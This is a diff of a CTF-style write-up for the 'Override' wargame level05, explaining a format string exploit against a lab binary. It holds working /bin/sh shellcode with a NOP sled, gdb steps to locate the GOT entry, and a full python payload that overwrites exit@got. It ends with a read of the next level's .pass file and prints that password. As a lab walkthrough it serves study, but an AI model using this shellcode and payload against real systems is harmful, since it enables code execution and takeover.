@@ -1,4 +1,6 @@
-1. Understand the binary
+# Override - level05
+
+## 1. Understand the binary
 
 We've started executing the binary to see what was asking.
 
@@ -14,6 +16,7 @@ We've tested with multiple inputs:
 
 With this tests we've undestood that in the code there was something like this:
 
+```
 int main()
 {
     char s[100];
@@ -21,8 +24,9 @@ int main()
     printf(s); <-- vulnerable printf
     exit (0);
 }
+```
 
-2. Format String Exploit
+## 2. Format String Exploit
 
 A FSE is an exploit based on injecting, using the vulnerable printf, some shellcode at a address
 in memory that will be called at some point in the program. To do this we need to choose a address
@@ -40,64 +44,81 @@ To do a FSE we need:
 
 We found online a bytecode that execute a /bin/sh (shellcode):
 
+```
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80
+```
 
 That is the bytecode for more or less this program:
 
+```
 int main() 
 {
     execve("/bin/sh", NULL, NULL);
 
     return (0);
 }
+```
 
 We exported the shellcode using python -c to add a NOP sled beginning of the env variable.
 A NOP sled is a series of identical values in memory that instruct the CPU to take no action
 and proceed to the next instruction. In our case we used \x90 as character (for Intel).
 
+```
 export SHELLCODE=$(python -c "print '\x90' * 200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80' ")
+```
 
 The NOP sled length is arbitrary as long as it overflows the env entry into another address.
 
-
 After we run
 
+```
 gdb level05 
+```
 
 put a breakpoint on main
 
+```
 b main
+```
 
 run the code and examinated the first 200 environ addesses at the breakpoint using
 
+```
 x/200s environ
+```
 
 and we found the end of the shellcode address:
 
+```
 0xffffd8ca:	 "\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\207\343\260\v̀".
+```
 
 Now we disassembled exit
 
+```
 disas exit
 
 0x08048370 <+0>:	jmp    *0x80497e0 <-- jump to the call on the GOT
 0x08048376 <+6>:	push   $0x18
 0x0804837b <+11>:	jmp    0x8048330
+```
 
 and we examine the jump address to find the GOT address
 
+```
 x 0x80497e0
 
 0x80497e0 <exit@got.plt>:	0x08048376
-
+```
 
 To find our write offset for the shellcode env var address we can test using
 AAAA and a %p. When the output will be 0x41414141 (A = 41 in hex) it means we have found the
 right position.
 
+```
 AAAA%10$p
 aaaa0x61616161 (61 because level05 binary do a tolowercase before printing the input)
-
+```
 
 So we need to overwrite 0x080497e0 (exit@got) with 0xffffd8ca (shellcode in env) at postion 10 on the Stack.
 
@@ -122,6 +143,7 @@ bytes from the previous writing).
 
 Now we can build our exploit:
 
+```
 It'll be: \xe0\x97\x04\x08 \xe2\x97\x04\x08 %55490x %10$n %10037x %11$n
 
 - \xe0\x97\x04\x08 or 0x080497e0 (in reverse order) points to the low order bytes.
@@ -130,9 +152,11 @@ It'll be: \xe0\x97\x04\x08 \xe2\x97\x04\x08 %55490x %10$n %10037x %11$n
 - %10$n will write 8 + 55490 = 55498 bytes (or 0xd8ca) at the first address specified (0x080497e0).
 - %10037x will write 10037 bytes on the standard output.
 - %11$n will write 8 + 55490 + 10037 = 65535 (or 0xffff) at the second address specified (0x080497e2).
+```
 
 Now as usual:
 
+```
 python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55490x' + '%10\$n' + '%10037x' + '%11\$n'" > /tmp/exploit
 
                                                                            ^                      ^
@@ -147,3 +171,4 @@ level06
 
 cat ~level06/.pass                
 h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+```
